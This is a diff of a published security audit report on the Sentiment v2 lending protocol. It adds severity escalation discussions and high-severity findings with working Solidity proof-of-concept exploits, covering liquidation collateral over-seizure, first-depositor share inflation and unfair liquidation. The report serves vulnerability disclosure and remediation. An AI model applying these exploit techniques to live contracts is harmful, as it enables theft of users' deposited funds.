@@ -1,9 +1,9 @@
-# Issue M-1: Red Stone Oracle Can Time Travel 
+# Issue H-1: Red Stone Oracle Can Time Travel 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/23 
 
 ## Found by 
-HHK, cawfree
+AlexCzm, HHK, cawfree, valuevalk
 ## Summary
 
 The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol) can be atomically manipulated repeatedly back and forth between different observations within the validity period to yield different price readings upon demand.
@@ -248,7 +248,481 @@ Allow at least the `THREE_MINUTES` period to expire since the last update before
 
 Here's an [example](https://github.com/euler-xyz/euler-price-oracle/blob/eeb1847df7d9d58029de37225dabf963bf1a65e6/src/adapter/redstone/RedstoneCoreOracle.sol#L71C9-L72C75) of this approach.
 
-# Issue M-2: Super pool uses `ERC20.approve` instead of safe approvals, causing it to always revert on some ERC20s 
+
+
+## Discussion
+
+**cawfree**
+
+Escalate
+
+Dependence upon the provided oracle implementation poses a **significant** risk to the protocol.
+
+Users have the freedom to arbitrarily control the price feeds of dependent assets in lieu of either significant attack complexity or prohibitive cost.
+
+Even slight price volatility over the course of the three minute validity period would provide ample opportunity for an attacker to amplify impact when warping repeatedly between observations - consequently, there would be increased likelihood for the regularity of multifaceted protocol exploits rooted in this manipulation.
+
+In this regard, we request this issue should be regarded as high severity.
+
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Dependence upon the provided oracle implementation poses a **significant** risk to the protocol.
+> 
+> Users have the freedom to arbitrarily control the price feeds of dependent assets in lieu of either significant attack complexity or prohibitive cost.
+> 
+> Even slight price volatility over the course of the three minute validity period would provide ample opportunity for an attacker to amplify impact when warping repeatedly between observations - consequently, there would be increased likelihood for the regularity of multifaceted protocol exploits rooted in this manipulation.
+> 
+> In this regard, we request this issue should be regarded as high severity.
+> 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**10xhash**
+
+Escalate
+
+There is no impact. The team has decided to choose any price within the range (-3 to +1) minutes as valid at any given timestamp
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> There is no impact. The team has decided to choose any price within the range (-3 to +1) minutes as valid at any given timestamp
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cawfree**
+
+@10xhash 
+
+So am I correct in understanding that you believe an attacker repeatedly warping the price oracle back and forth between two preferred observations within the same transaction does not pose a risk to the protocol? 
+
+
+**MrValioBg**
+
+Hey @10xhash!
+The core issue here is that the current logic allows someone to bring back old prices. It's true that prices which are at most 3 minutes old may be submitted, but that's not the main problem. The issue is that a more recent price can be replaced by an older one, with no limit on how many times this can happen, as long as the older price is within the last 3 minutes.
+
+The problem arises when, for example, price X is submitted, followed by price Y. Anyone can bring back the older price X, even though price Y is more recent and up to date. This not only opens the door for back-and-forth switching between prices, as @cawfree described, but an attacker can arbitrarily choose older prices before the Y price.
+
+Now, imagine that we are currently at `00:00:00`, and consider the following scenario. A stable price, P1, aggregated 2-3 seconds earlier, so around `23:59:58`, is set via the `updatePrice()` function,.
+
+However, within the last 3 minutes, there was a brief period of volatility in the market, leading to a sudden but quickly recovered drop. This kind of scenario happens often—many tokens can drop by 1-2% and regain their value in a matter of seconds. During this volatility, Redstone Oracle aggregated a bad price at, say, `23:57:21`. 
+
+Although the recent price, P1, has already been submitted and correctly updated in the protocol, anyone can currently bring back the sudden drop from `23:57:21`, leading to potential liquidations + arbitrage activities, as they can also bring the P1 back.
+
+You may argue that this price at `23:57:21` could have been submitted anyway, but it was *not*. Allowing to bring it back and switch it with a a more current one *unlimited amount of times poses significant risks. This won't be possible if we did not allow older prices to be set. ( Here we refer to older, as older than the current one set ) 
+
+Since this can lead to a significant loss of funds, this issue is valid. It should be upgraded to **high severity**, as per Sherlock's rules.
+
+I've also submitted the same issue [here](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/537), and it should be marked as **HIGH** severity and labeled as a **duplicate** as well. ( @cawfree has escalated it :) )
+
+**cvetanovv**
+
+I agree with @cawfree escalation.
+
+The ability to manipulate the Redstone Oracle by repeatedly submitting older prices within the 3-minute validity period poses a significant risk to the protocol. 
+
+The fact that an attacker can choose between different valid price points in the same transaction creates an opportunity for price manipulation, leading to potential liquidations and arbitrage exploitation. 
+
+Planning to accept @cawfree  escalation and make this issue High.
+
+**Evert0x**
+
+Result:
+High
+Has Duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [cawfree](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/23/#issuecomment-2351821633): accepted
+- [10xhash](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/23/#issuecomment-2358466218): rejected
+
+# Issue H-2: User's can seize more assets during liquidation by using type(uint).max 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/556 
+
+## Found by 
+A2-security, Brenzee, EgisSecurity, hash, serial-coder, sl1
+## Summary
+User's can seize more assets during liquidation than what should be actually allowed by replaying the repayment amount using type(uint).max 
+
+## Vulnerability Detail
+The liquidators are restricted on the amount of collateral they can seize during a liquidation
+
+Eg:
+if a position has 1e18 worth debt, and 2e18 worth collateral, then on a liquidation the user cannot seize 2e18 collateral by repaying the 1e18 debt, and they are limited to seizing for ex. 1.3e18 worth of collateral (depends on the liquidation discount how much profit a liquidator is able to generate)
+
+The check for this max seizable amount is kept inside `_validateSeizedAssetValue`
+
+[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145)
+```solidity
+    function _validateSeizedAssetValue(
+        address position,
+        DebtData[] calldata debtData,
+        AssetData[] calldata assetData,
+        uint256 discount
+    ) internal view {
+        // compute value of debt repaid by the liquidator
+        uint256 debtRepaidValue;
+        uint256 debtLength = debtData.length;
+        for (uint256 i; i < debtLength; ++i) {
+            uint256 poolId = debtData[i].poolId;
+            uint256 amt = debtData[i].amt;
+            if (amt == type(uint256).max) amt = pool.getBorrowsOf(poolId, position);
+            address poolAsset = pool.getPoolAssetFor(poolId);
+            IOracle oracle = IOracle(riskEngine.getOracleFor(poolAsset));
+            debtRepaidValue += oracle.getValueInEth(poolAsset, amt);
+        }
+
+        .....
+
+        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
+        if (assetSeizedValue > maxSeizedAssetValue) {
+            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
+        }
+```
+
+But the `_validateSeizedAssetValue` is flawed as it assumes that the value `type(uint256).max` will result in the liquidator repaying the current `pool.getBorrowsOf(poolId, position)` value. In the actual execution, an attacker can repay some amount earlier and then use `type(uint256).max` on the same pool which will result in a decreased amount because debt has been repaid earlier
+
+Eg:
+getBorrows of position = 1e18
+user passes in 0.9e18 and type(uint).max as the repaying values
+the above snippet will consider it as 0.9e18 + 1e18 being repaid and hence allow for more than 1.9e18 worth of collateral to be seized
+but during the actual execution, since 0.9e18 has already been repaid, only 0.1e18 will be transferred from the user allowing the user
+
+### POC Code
+Apply the following diff and run `testHash_LiquidateExcessUsingDouble`. It is asserted that a user can use this method to seize the entire collateral of the debt position even though it results in a much higher value than what should be actually allowed
+
+```diff
+diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
+index beaca63..29e674a 100644
+--- a/protocol-v2/test/integration/LiquidationTest.t.sol
++++ b/protocol-v2/test/integration/LiquidationTest.t.sol
+@@ -48,6 +48,85 @@ contract LiquidationTest is BaseTest {
+         vm.stopPrank();
+     }
+ 
++    function testHash_LiquidateExcessUsingDouble() public {
++        vm.startPrank(user);
++        asset2.approve(address(positionManager), 1e18);
++
++        // deposit 1e18 asset2, borrow 1e18 asset1
++        Action[] memory actions = new Action[](7);
++        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
++        actions[1] = deposit(address(asset2), 1e18);
++        actions[2] = addToken(address(asset2));
++        actions[3] = borrow(fixedRatePool, 1e18);
++        actions[4] = approve(address(mockswap), address(asset1), 1e18);
++        bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset2), 1e18);
++        actions[5] = exec(address(mockswap), 0, data);
++        actions[6] = addToken(address(asset3));
++        positionManager.processBatch(position, actions);
++        vm.stopPrank();
++        assertTrue(riskEngine.isPositionHealthy(position));
++
++        (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);
++
++        assertEq(totalAssetValue, 2e18);
++        assertEq(totalDebtValue, 1e18);
++        assertEq(minReqAssetValue, 2e18);
++
++        // modify asset2 price from 1eth to 0.9eth
++        // now there is 1e18 debt and 1.8e18 worth of asset2
++        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(0.9e18);
++        vm.prank(protocolOwner);
++        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
++        assertFalse(riskEngine.isPositionHealthy(position));
++        
++        // maximumSeizable amount with liquidation discount : 1388888888888888888 ie. 1.38e18
++        uint liquidationDiscount = riskEngine.riskModule().LIQUIDATION_DISCOUNT();
++        uint supposedMaximumSeizableAssetValue = totalDebtValue * 1e18 / (1e18 - liquidationDiscount);
++        uint maximumSeizableAssets = supposedMaximumSeizableAssetValue * 1e18 / 0.9e18;
++
++        assert(maximumSeizableAssets == 1388888888888888888);
++
++        DebtData memory debtData = DebtData({ poolId: fixedRatePool, amt: 1e18 });
++        DebtData[] memory debts = new DebtData[](1);
++        debts[0] = debtData;
++
++        // verifying that attempting to seize more results in a revert
++        // add dust to cause minimal excess
++        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: maximumSeizableAssets + 10 });
++        AssetData[] memory assets = new AssetData[](1);
++        assets[0] = asset2Data;
++
++        asset1.mint(liquidator, 10e18);
++
++        vm.startPrank(liquidator);
++        asset1.approve(address(positionManager), 1e18);
++
++        // seizeAttempt value : 1250000000000000008, seizable value : 1250000000000000000
++        vm.expectRevert(abi.encodeWithSelector(RiskModule.RiskModule_SeizedTooMuch.selector, 1250000000000000008, 1250000000000000000));
++        positionManager.liquidate(position, debts, assets);
++        vm.stopPrank();
++
++        // but an attacker can liquidate almost double by exploiting the type.max issue
++        debtData = DebtData({ poolId: fixedRatePool, amt: 0.9e18 });
++        debts = new DebtData[](2);
++        debts[0] = debtData;
++
++        // replay the balance value. this will cause the repaid amount to be double counted allowing the user to liquidate the entire assets
++        debtData = DebtData({ poolId: fixedRatePool, amt: type(uint256).max });
++        debts[1] = debtData;
++
++        // liquidate full asset balance
++        asset2Data = AssetData({ asset: address(asset2), amt: 2e18 });
++        assets = new AssetData[](1);
++        assets[0] = asset2Data;
++
++        // liquidate
++        vm.startPrank(liquidator);
++        asset1.approve(address(positionManager), 1e18);
++        positionManager.liquidate(position, debts, assets);
++        vm.stopPrank();
++    }
++
+     function testLiquidate() public {
+         vm.startPrank(user);
+         asset2.approve(address(positionManager), 1e18);
+```
+
+## Impact
+Borrowers will loose excess collateral during liquidation
+
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145
+
+## Tool used
+Manual Review
+
+## Recommendation
+Only allow a one entry for each poolId in the `debtData` array. This can be enforced by checking that the array is in a strictly sequential order on pools 
+
+
+
+## Discussion
+
+**serial-coder**
+
+*I cannot escalate the issue due to an insufficient escalation threshold.*
+
+Hi @z3s,
+
+Why was this issue downgraded to medium?
+
+With this vulnerability, a liquidator can seize all collateral. For proof, please refer to the coded PoC in my issue (#505).
+
+For this reason, this issue should be high.
+
+Thanks for your time.
+
+**kazantseff**
+
+Escalate,
+per the above comment
+
+**sherlock-admin3**
+
+> Escalate,
+> per the above comment
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+@z3s Can you give your opinion, please?
+
+**cvetanovv**
+
+I'm unclear why the lead judge classified this issue as Medium, but I believe this issue can be High severity.
+
+The core problem lies in the ability to replay a previous repayment using `type(uint256).max`, which allows attackers to manipulate the liquidation process. 
+
+This manipulation results in liquidators seizing significantly more collateral than they are entitled to. Such a flaw could lead to borrowers losing a much larger portion of their collateral, creating a direct financial loss for affected users.
+
+Planning to accept the escalation and make this issue High severity.
+
+**WangSecurity**
+
+Result:
+High
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [kazantseff](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/556/#issuecomment-2353689078): accepted
+
+# Issue H-3: rounding error due to internal accounting and can steal some portion of the first depositors  funds 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/597 
+
+## Found by 
+Obsidian, smbv-1923, vatsal
+## Summary
+
+## Vulnerability Detail
+
+- where: All basepool 
+- when: Total Supply of a pool is zero 
+
+- When total supply of pool is zero an attacker goes ahead and executes the following steps
+
+1. mint some asset and deposit some collateral sufficient to borrow those assets. 
+2. Borrow a few of those assets and wait for a few block. In 100 second when at least more than 1wei interest has occurred, repay all the borrowed funds.
+3. [to match this condition ](https://github.com/sentimentxyz/protocol-v2/blob/master/src/Pool.sol#L361) attacker will directly transfer some funds because[ total balance](https://github.com/sentimentxyz/protocol-v2/blob/master/src/Pool.sol#L360) is calculate like using balanceof(Address(this)) 
+4. after this withdraw all but 2 wei of shares. to makes it so that the totalDepositShares = 1 and totalDepositAssets = 2 due to rounding.
+- Now attacker takes advantage of rounding down when depositing to inflate the price of a share.
+
+
+In a loop attacker does the following till they get their desired price of 1 share
+
+- deposit totalDeposits + 1 assets and withdraw  1 shares 
+  - according to `convertToShares = assets.mulDiv(totalShares, totalAssets, rounding);`
+  - it mints  `shares = (amount * total.shares) / total.amount` of shares.
+  - Since the attacker has deposited totalDeposits + 1 assets and totalDepositShares is 1, shares = (totalDeposits  + 1 * 1) / totalDeposits = 1 
+  - This should have been 1.9999... but due to rounding down, the attacker gets minted 1 shares is minted
+  - 
+  - and attacker withdrew in the same 1 wei transactions . 
+  - This means at this point `totalDepositShares = 1+1 (minted shares )- 1 (withdrew amount )= 1` and `totalDeposits = totalDeposits + totalDeposits + 1`
+  - In this loop the supply stays at 1 and totalDeposits increase exponentially. Take a look at the POC to get a better idea.
+ 
+
+So when a user comes to the deposit get some shares but they lose of assets which get proportionally divided between existing share holders (including the attacker) due to rounding errors.
+- users keep losing up to 33% of their assets. (see [here](https://www.desmos.com/calculator/0hrgaxkdyr))
+- This means that for users to not lose value, they have to make sure that they have to deposit exact proportion of the attacker shares is an integer.
+
+
+## Impact
+- Loss of 33% of all pool 1st depositor funds 
+
+## Code Snippet
+```solidity
+function testInternalDepoisitBug(uint96 assets) public {
+        vm.assume(assets > 0);
+        
+        // address notPositionManager = makeAddr("notPositionManager");
+        
+        vm.startPrank(user);
+
+        asset1.mint(user, 50_000 ether);
+        asset1.approve(address(pool), 50_000 ether);
+
+        pool.deposit(linearRatePool, 1 ether, user);
+        
+        vm.startPrank(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY));
+        asset1.mint(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY), 50_000 ether);
+        console2.log("balance",asset1.balanceOf(registry.addressFor(SENTIMENT_POSITION_MANAGER_KEY)));
+        pool.borrow(linearRatePool, user, 1e16 );
+
+        
+
+
+        vm.warp(block.timestamp + 10 seconds);
+        vm.roll(block.number + 100);
+
+
+    
+        uint256 borrowed = pool.getBorrowsOf(linearRatePool, user);
+        pool.repay(linearRatePool,user, borrowed);
+
+        
+        vm.startPrank(user);
+        uint256 asset_to_withdraw = pool.getAssetsOf(linearRatePool, user);
+
+        // able to transfer because the withdraw function is calculating the total balance using the balanceOf(address(this))
+        asset1.transfer(address(pool), 10000003000000001);
+        asset1.transfer(address(pool), 200496896);
+        
+
+        pool.withdraw(linearRatePool, asset_to_withdraw-2, user, user);
+        (,,,,,,,,,uint256 totalDepositAssets,uint256 totalDepositShares) = pool.poolDataFor(linearRatePool);
+
+        
+
+        for(uint8 i = 1; i < 75; i++){
+            console2.log("loop", 2**i+1);
+            pool.deposit(linearRatePool, 2**i+1 , user);
+            // recived shares must be 1 share
+
+            
+            pool.withdraw(linearRatePool,1,user,user);
+            (,,,,,,,,, totalDepositAssets, totalDepositShares) = pool.poolDataFor(linearRatePool);
+            
+           
+
+            require(totalDepositShares == 1, "sharesReceived is not one as expected");
+
+
+        }
+        uint256 attackerTotalDepositAssets = totalDepositAssets;
+        uint256 attackerDepositShares = totalDepositShares;
+        vm.stopPrank();
+        vm.startPrank(user2);
+        (,,,,,,,,, totalDepositAssets, totalDepositShares) = pool.poolDataFor(linearRatePool);
+        uint256 User2DepositAmount  = 2 * totalDepositAssets;
+        asset1.mint(user2, User2DepositAmount -10);
+        asset1.approve(address(pool), User2DepositAmount );
+        pool.deposit(linearRatePool, User2DepositAmount -10, user2);
+
+
+        
+
+        (,,,,,,,,, totalDepositAssets, totalDepositShares) = pool.poolDataFor(linearRatePool);
+        uint256 userTotalDepositAssets = User2DepositAmount -10;
+        uint256 userDepositShares = totalDepositShares - attackerDepositShares;
+        require(totalDepositShares == 2, "sharesReceived is not zero as expected");
+
+
+        //NOTE: Here user1/attacker depsosited very less amount than the user2 
+        console2.log("-----Here user1/attacker depsosited very less amount than the user2 ------");
+        console2.log("attackerTotalDepositAssets",attackerTotalDepositAssets);
+        console2.log("userTotalDepositAssets",userTotalDepositAssets);
+
+
+        assertLt(attackerTotalDepositAssets,userTotalDepositAssets, "user2 deposited is not big amount than the user1" );
+
+
+        //NOTE: Here Both shares are the same and it's 1
+        console2.log("------Here Both shares are the same and it's 1------");
+        console2.log("attackerDepositShares",attackerTotalDepositAssets);
+        console2.log("userDepositShares",userTotalDepositAssets);
+
+
+        require(userDepositShares == attackerDepositShares, "sharesReceived is not same as expected");
+
+    }
+```
+<img width="1016" alt="image" src="https://github.com/user-attachments/assets/0fca0433-2223-4b75-8ff9-fe8742267f64">
+
+
+## Recommendation
+I like how [BalancerV2](https://github.com/balancer-labs/balancer-v2-monorepo/blob/master/pkg/pool-utils/contracts/BasePool.sol#L307-L325) and [UniswapV2](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L121) do it
+
+
+
+# Issue M-1: Super pool uses `ERC20.approve` instead of safe approvals, causing it to always revert on some ERC20s 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/48 
 
@@ -372,342 +846,7 @@ function testSuperPoolUSDT() public {
 
 Use `safeApprove` instead of `approve` in `SuperPoolFactory::deploySuperPool` and `SuperPool::reallocate`.
 
-# Issue M-3: Removing a known asset in the `PositionManager` causes all deposited funds of that asset to be locked forever 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/71 
-
-## Found by 
-000000, 0xAlix2, 0xAristos, 0xDazai, 0xLeveler, A2-security, KupiaSec, Tendency, ThePharmacist, Yashar, almurhasan, cryptomoon, dhank, iamandreiski, theweb3mechanic, tvdung94
-### Summary
-
-When users deposit funds in their position through the position manager, it checks if the deposited asset is known, this is done in:
-```solidity
-// mitigate unknown assets being locked in positions
-if (!isKnownAsset[asset]) revert PositionManager_DepositUnknownAsset(asset);
-```
-This makes sense, as not to allow users to deposit dummy/worthless assets in their positions. The position manager also allows users to transfer tokens out of their position, the main problem is that it also checks if the asset is known before allowing the transfer.
-
-This causes an issue where if the user had some funds deposited in token X, and then that token X was removed from known assets, the user's funds will be locked/stuck forever.
-
-**NOTE: even if the owner is trusted, however, in case of an attack or a depeg or any other scenario, and the owner urgently removes the asset, users should still be able to transfer out these tokens. It doesn't make sense for the owner to "wait" until all users transfer out these tokens in case of an emergency.**
-
-
-### Root Cause
-
-The main issue lies in the "isKnownAsset" check in `PositionManager::transfer`, https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L316:
-```solidity
-if (!isKnownAsset[asset]) revert PositionManager_TransferUnknownAsset(asset);
-```
-
-### Attack Path
-
-1. The user deposits some funds of token X.
-2. For whatever reason, X is removed from the known assets in the position manager.
-3. The user is unable to transfer out his deposited tokens, and they're stuck forever.
-
-### Impact
-
-The user's tokens will remain stuck in his position forever.
-
-### PoC
-
-Add the following test in `protocol-v2/test/core/PositionManager.t.sol`:
-
-```solidity
-function testStuckTokens() public {
-    uint256 amount = 100 ether;
-
-    deal(address(asset2), positionOwner, amount);
-
-    // Verify that asset2 is known
-    assertTrue(
-        PositionManager(positionManager).isKnownAsset(address(asset2))
-    );
-
-    // User adds asset2 to the position and deposits 100 tokens
-    vm.startPrank(positionOwner);
-    asset2.approve(address(positionManager), amount);
-    PositionManager(positionManager).process(
-        position,
-        addToken(address(asset2))
-    );
-    PositionManager(positionManager).process(
-        position,
-        deposit(address(asset2), amount)
-    );
-    vm.stopPrank();
-
-    // asset2 is removed from the known assets
-    vm.prank(protocolOwner);
-    PositionManager(positionManager).toggleKnownAsset(address(asset2));
-
-    // Verify that asset2 is not known
-    assertFalse(
-        PositionManager(positionManager).isKnownAsset(address(asset2))
-    );
-
-    // User tries to transfer out his tokens, reverts
-    vm.prank(positionOwner);
-    vm.expectRevert(
-        abi.encodeWithSelector(
-            PositionManager.PositionManager_TransferUnknownAsset.selector,
-            address(asset2)
-        )
-    );
-    PositionManager(positionManager).process(
-        position,
-        transfer(positionOwner, address(asset2), amount)
-    );
-}
-```
-
-### Mitigation
-
-Remove the "isKnownAsset" check from `PositionManager::transfer`.
-
-# Issue M-4: Liquidators Are Incentivised To Create Imaginary Borrow Debt 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/80 
-
-## Found by 
-Oblivionis, Obsidian, X12, cawfree
-## Summary
-
-Liquidators have the freedom to control how many borrow shares are burned from a position during liquidation, regardless of the underlying capital that is taken.
-
-This allows liquidators to liquidate positions but leave them in a state that they continue to grow unhealthy, **even though all outstanding debts have been repaid**.
-
-## Vulnerability Detail
-
-When liquidating a risky position via [`liquidate`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L430C14-L430C23), the liquidator has the freedom to specify the to be taken from the position (`assetData`) independently of the outstanding debt that is processed (`debtData`):
-
-```solidity
-/// @notice Liquidate an unhealthy position
-/// @param position Position address
-/// @param debtData DebtData object for debts to be repaid
-/// @param assetData AssetData object for assets to be seized
-function liquidate(
-    address position,
-    DebtData[] calldata debtData, /// @audit debtData_and_assetData_are_independent_of_one_another
-    AssetData[] calldata assetData
-) external nonReentrant {
-    riskEngine.validateLiquidation(position, debtData, assetData);
-
-    // liquidate
-    _transferAssetsToLiquidator(position, assetData);
-    _repayPositionDebt(position, debtData);
-
-    // position should be within risk thresholds after liquidation
-    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
-    emit Liquidation(position, msg.sender, ownerOf[position]);
-}
-```
-
-Due to insufficient validation, there is a discontinuity between the number of assets that are taken from a position versus the underlying shares that are burned.
-
-We can demonstrate that due to this inconsistency, a liquidator can liquidate a position and has the power to control whether to burn all the outstanding borrows (i.e. make the position healthy again) or liquidate the same amount of assets but leave outstanding borrows (i.e. make the position healthy again but allow it to continue to grow unhealthy post liquidation, even though all obligations have been fully repaid).
-
-In both instances, although all of debt is repaid, the liquidator can control the amount of borrow shares remaining; thus they can fully liquidate a position but allow the position to grow more unhealthy as a means of value extraction.
-
-### LiquidationTest.t.sol
-
-To verify the following proof of concept, copy the `testLiquidateUnfairly` function to [`test/LiquidationTest.t.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/test/integration/LiquidationTest.t.sol#L12C10-L12C25):
-
-```solidity
-/// @notice The liquidator can leave outstanding debt obligations
-/// @notice for fully-repaid loans.
-function testLiquidateUnfairly() public {
-
-    /// @notice The environment variable `SHOULD_LIQUIDATE_UNFAIRLY` can
-    /// @notice can be used to toggle between the different cases:
-    bool shouldLiquidateUnfairly = vm.envExists("SHOULD_LIQUIDATE_UNFAIRLY")
-        && vm.envBool("SHOULD_LIQUIDATE_UNFAIRLY");
-
-    /// @dev Prepare assets for the two users:
-    asset1.mint(lender, 200e18);
-    asset2.mint(user, 200e18);
-
-    vm.prank(user);
-        asset2.approve(address(positionManager), type(uint256).max);
-
-    /// @dev Create positions for both users.
-    (address userPosition, Action memory userAction)
-        = newPosition(user, bytes32(uint256(0x123456789)));
-
-    /// @dev Let's also assume the pool has deep liquidity:
-    vm.startPrank(lender);
-        asset1.approve(address(pool), type(uint256).max);
-        pool.deposit(fixedRatePool, 100e18, lender);
-    vm.stopPrank();
-
-    /// @dev Let's create a borrow positions for the `user`:
-    Action[] memory actions = new Action[](4);
-    {
-        vm.startPrank(user);
-            actions[0] = userAction;
-            actions[1] = deposit(address(asset2), 1e18);
-            actions[2] = addToken(address(asset2));
-            actions[3] = borrow(fixedRatePool, 0.5e18);
-            positionManager.processBatch(userPosition, actions);
-        vm.stopPrank();
-    }
-
-    /// @dev Created position is healthy:
-    assertTrue(riskEngine.isPositionHealthy(userPosition));
-
-    /// @dev Okay, let's assume due to market conditions,
-    /// @dev asset2 deprecations and the position has become
-    /// @dev liquidatable:
-    vm.startPrank(protocolOwner);
-        riskEngine.setOracle(address(asset2), address(new FixedPriceOracle(0.99e18))); // 1 asset2 = 0.99 eth
-    vm.stopPrank();
-
-    /// @dev Created position is unhealthy:
-    assertFalse(riskEngine.isPositionHealthy(userPosition));
-
-    (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(userPosition);
-
-    console.log(
-        shouldLiquidateUnfairly
-            ? "Liquidating unfairly..."
-            : "Liquidating fairly..."
-    );
-
-    uint256 positionShortfall = minReqAssetValue - totalAssetValue;
-    assertEq(positionShortfall, 10000000000000000);
-
-    /// @dev Liquidate the `userPosition`.
-    asset1.mint(liquidator, 100 ether);
-    vm.startPrank(liquidator);
-        asset1.approve(address(positionManager), type(uint256).max);
-
-        /// @notice Initial Liquidator Balances:
-        assertEq(asset1.balanceOf(liquidator), 100000000000000000000);
-        assertEq(asset2.balanceOf(liquidator), 0);
-
-        /// @notice Initial Position Balances:
-        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
-        assertEq(asset2.balanceOf(userPosition), 1000000000000000000);
-        assertEq(protocol.pool().getBorrowsOf(fixedRatePool, userPosition), 500000000000000000);
-
-        {
-            // construct liquidator data
-            DebtData[] memory debts = new DebtData[](1);
-            debts[0] = DebtData({
-                poolId: fixedRatePool,
-                /// @notice In the fair case, the liquidator takes `500000000000000000`
-                /// @notice borrow shares (`getBorrowsOf`). In the unfair case, the
-                /// @notice liquidator need only take `10000000000000000`:
-                amt: shouldLiquidateUnfairly ? 10000000000000000 : type(uint256).max
-            });
-            AssetData[] memory assets = new AssetData[](1);
-            assets[0] = AssetData({ asset: address(asset2), amt: positionShortfall });
-            positionManager.liquidate(userPosition, debts, assets);
-        }
-
-        assertTrue(riskEngine.isPositionHealthy(userPosition)) /* @notice Position is healthy immediately after. */;
-
-        /// @notice First, notice the position's underlying assets are
-        /// @notice liquidated identically for both the unfair liquidation
-        /// @notice and the fair liquidation. This means in both instances,
-        /// @notice all outstanding debt is repaid.
-        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
-        assertEq(asset2.balanceOf(userPosition), 990000000000000000);
-
-        assertEq(
-            protocol.pool().getBorrowsOf(fixedRatePool, userPosition),
-            /// @notice However, the unfair liquidation left outstanding borrow
-            /// @notice shares even though the underlying assets were liquidated
-            /// @notice consistently:
-            shouldLiquidateUnfairly ? 490000000000000000 : 0
-        );
-
-        /// @notice When liquidating unfairly by leaving bad shares, the
-        /// @notice liquidator spends less `asset1` in the process. This means
-        /// @notice the protocol actually incentivises liquidators to act
-        /// @notice maliciously:
-        assertEq(
-            asset1.balanceOf(liquidator),
-            shouldLiquidateUnfairly
-                ? 99990000000000000000 /// @audit The liquidator is charged less for leaving outstanding borrow shares.
-                : 99500000000000000000
-        );
-
-        vm.warp(block.timestamp + 24 hours);
-
-        /// @notice If the liquidator operates maliciously, the position
-        /// @notice is unfairly liable to more liquidations as time progresses:
-        assertEq(riskEngine.isPositionHealthy(userPosition), !shouldLiquidateUnfairly);
-        console.log(
-            string(
-                abi.encodePacked(
-                    "One day after liquidation, the position is ",
-                    riskEngine.isPositionHealthy(userPosition) ? "healthy" : "unhealthy",
-                    "."
-                )
-            )
-        );
-
-    vm.stopPrank();
-}
-```
-
-Then run using:
-
-```shell
-SHOULD_LIQUIDATE_UNFAIRLY=false forge test --match-test "testLiquidateUnfairly" -vv # Happy path
-SHOULD_LIQUIDATE_UNFAIRLY=true forge test --match-test "testLiquidateUnfairly" -vv # Malicious path
-```
-
-This confirms that liquidators have the choice to leave outstanding borrow shares on liquidated positions, even though for the exact same liquidation of assets, the position could have been left with zero outstanding borrow shares.
-
-Additionally, we show that the liquidator actually returns less `asset1` to the pool, even though they are redeeming the same amount of underlying `asset2` from the liquidated position.
-
-## Impact
-
-Due to the monetary incentives, it is actually **more rational** for liquidators **to liquidate positions unfairly**.
-
-This undermines the safety of all borrowers.
-
